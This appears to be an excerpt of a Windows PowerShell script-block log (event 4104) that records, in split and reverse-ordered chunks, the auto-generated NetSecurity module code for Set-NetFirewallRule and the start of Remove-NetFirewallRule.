    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
    

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (9 of 19):
Parameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Service'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Service'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('InterfaceAlias')) {
            [object]$__cmdletization_value = ${InterfaceAlias}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceAlias'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceAlias'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('InterfaceType')) {
            [object]$__cmdletization_value = ${InterfaceType}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalUser')) {
            [object]$__cmdletization_value = ${LocalUser}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalUser'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalUser'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteUser')) {
            [object]$__cmdletization_value = ${RemoteUser}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteUser'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteUser'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteMachine')) {
            [object]$__cmdletization_value = ${RemoteMachine}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteMachine'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteMachine'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Authentication')) {
            [object]$__cmdletization_value = ${Authentication}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Authentication'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Authentication'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Encryption')) {
            [object]$__cmdletization_value = ${Encryption}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Encryption'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Encryption'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('OverrideBlockRules')) {
            [object]$__cmdletization_value = ${OverrideBlockRules}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:OverrideBlockRules'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:OverrideBlockRules'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteDynamicKeywordAddresses')) {
            [object]$__cmdletization_value = ${RemoteDynamicKeywordAddresses}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteDynamicKeywordAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteDynamicKeywordAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PolicyAppId')) {
            [object]$__cmdletization_value = ${PolicyAppId}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PolicyAppId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PolicyAppId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PackageFamilyName')) {
            [object]$__cmdletization_value = ${PackageFamilyName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PackageFamilyName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PackageFamilyName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallRule' -Alias '*'
        

function Remove-NetFirewallRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/st

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (8 of 19):
.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EdgeTraversalPolicy')) {
            [object]$__cmdletization_value = ${EdgeTraversalPolicy}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EdgeTraversalPolicy'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EdgeTraversalPolicy'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LooseSourceMapping')) {
            [object]$__cmdletization_value = ${LooseSourceMapping}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LooseSourceMapping'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LooseSourceMapping'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalOnlyMapping')) {
            [object]$__cmdletization_value = ${LocalOnlyMapping}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalOnlyMapping'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalOnlyMapping'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Owner')) {
            [object]$__cmdletization_value = ${Owner}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Owner'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Owner'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalAddress')) {
            [object]$__cmdletization_value = ${LocalAddress}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteAddress')) {
            [object]$__cmdletization_value = ${RemoteAddress}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Protocol')) {
            [object]$__cmdletization_value = ${Protocol}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalPort')) {
            [object]$__cmdletization_value = ${LocalPort}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemotePort')) {
            [object]$__cmdletization_value = ${RemotePort}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IcmpType')) {
            [object]$__cmdletization_value = ${IcmpType}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:IcmpType'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:IcmpType'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DynamicTarget')) {
            [object]$__cmdletization_value = ${DynamicTarget}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:DynamicTransport'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:DynamicTransport'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Program')) {
            [object]$__cmdletization_value = ${Program}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Program'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Program'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Package')) {
            [object]$__cmdletization_value = ${Package}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Package'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Package'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Service')) {
            [object]$__cmdletization_value = ${Service}
            $__cmdletization_method

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (7 of 19):
ame='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${LocalUser},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteUser},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteMachine},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication]
    ${Authentication},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption]
    ${Encryption},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [bool]
    ${OverrideBlockRules},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemoteDynamicKeywordAddresses},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${PolicyAppId},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${PackageFamilyName},

    [Parameter(ParameterSetName='ByName')]
